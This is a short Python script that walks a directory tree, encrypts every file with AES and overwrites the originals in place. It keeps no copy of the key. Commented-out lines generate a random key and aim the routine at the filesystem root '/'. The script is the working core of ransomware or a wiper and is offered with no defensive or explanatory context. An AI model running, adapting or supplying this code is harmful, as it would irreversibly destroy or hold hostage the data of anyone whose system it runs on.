import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

class encrypt:
    def encrypt_directory(root_dir, key):
        for dirpath, dirnames, filenames in os.walk(root_dir):
            for filename in filenames:
                filepath = os.path.join(dirpath, filename)
                with open(filepath, 'rb') as f:
                    plaintext = f.read()

                cipher = AES.new(key, AES.MODE_EAX)
                ciphertext, tag = cipher.encrypt_and_digest(plaintext)

                with open(filepath, 'wb') as f:
                    f.write(cipher.nonce)
                    f.write(tag)
                    f.write(ciphertext)

#key = get_random_bytes(16)
#encrypt_directory("/", key)
